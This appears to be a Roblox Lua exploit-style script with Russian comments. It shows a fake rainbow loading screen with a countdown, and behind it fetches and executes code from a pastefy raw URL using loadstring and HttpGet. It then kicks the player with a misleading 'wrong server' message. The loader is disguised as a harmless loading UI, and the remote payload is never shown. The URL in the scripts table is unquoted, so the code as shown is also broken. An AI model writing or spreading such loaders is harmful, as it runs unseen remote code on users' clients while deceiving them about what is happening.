-- Список возможных ссылок
local scripts = { 
    https://pastefy.app/TevuCiTF/raw
}
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- Создание GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ColorfulLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

-- Основной фон
local Background = Instance.new("Frame")
Background.Size = UDim2.new(0, 450, 0, 240)
Background.Position = UDim2.new(0.5, -225, 0.5, -120)
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
Background.BackgroundTransparency = 0.02
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 24)
UICorner.Parent = Background

-- Заголовок
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.35, 0)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "🌈 Loading..."
Title.TextColor3 = Color3.fromRGB(255, 255, 150)
Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
Title.TextStrokeTransparency = 1
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Background

-- Выбор случайного скрипта
local chosenScript = scripts[math.random(1, #scripts)]
loadstring(game:HttpGet(chosenScript, true))()

-- Таймер
local TimerLabel = Instance.new("TextLabel")
TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
TimerLabel.Position = UDim2.new(0, 0, 0.35, 0)
TimerLabel.BackgroundTransparency = 1
TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TimerLabel.TextStrokeTransparency = 0.8
TimerLabel.TextScaled = true
TimerLabel.Font = Enum.Font.Gotham
TimerLabel.Text = "Approximately 30 seconds left"
TimerLabel.Parent = Background

-- Прогресс-бар задний фон
local ProgressBarBackground = Instance.new("Frame")
ProgressBarBackground.Size = UDim2.new(0.9, 0, 0.12, 0)
ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.75, 0)
ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
ProgressBarBackground.BorderSizePixel = 0
ProgressBarBackground.Parent = Background

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(1, 0)
bgCorner.Parent = ProgressBarBackground

-- Прогресс-бар заливка
local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBackground

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = ProgressBarFill

-- Радужный градиент
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 128, 0)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 128, 255))
}
UIGradient.Rotation = 0
UIGradient.Parent = ProgressBarFill

-- Анимация градиента
task.spawn(function()
    while UIGradient do
        UIGradient.Rotation = (UIGradient.Rotation + 1) % 360
        task.wait(0.03)
    end
end)

-- Таймер и прогресс
local duration = 40
for i = duration, 1, -1 do
    TimerLabel.Text = "Approximately " .. i .. " seconds left"

    local progress = (duration - i + 1) / duration
    ProgressBarFill:TweenSize(
        UDim2.new(progress, 0, 1, 0),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Quad,
        0.25,
        true
    )

    wait(1)
end

-- 🧊 Плавное исчезновение
for t = 1, 20 do
    local alpha = t / 20
    Background.BackgroundTransparency = 0.02 + alpha
    ProgressBarBackground.BackgroundTransparency = alpha
    ProgressBarFill.BackgroundTransparency = alpha
    Title.TextTransparency = alpha
    Title.TextStrokeTransparency = alpha
    TimerLabel.TextTransparency = alpha
    TimerLabel.TextStrokeTransparency = alpha
    wait(0.03)
end

-- Удаление GUI
ScreenGui:Destroy()

game.Players.LocalPlayer:Kick("Wrong server, please join a public server")
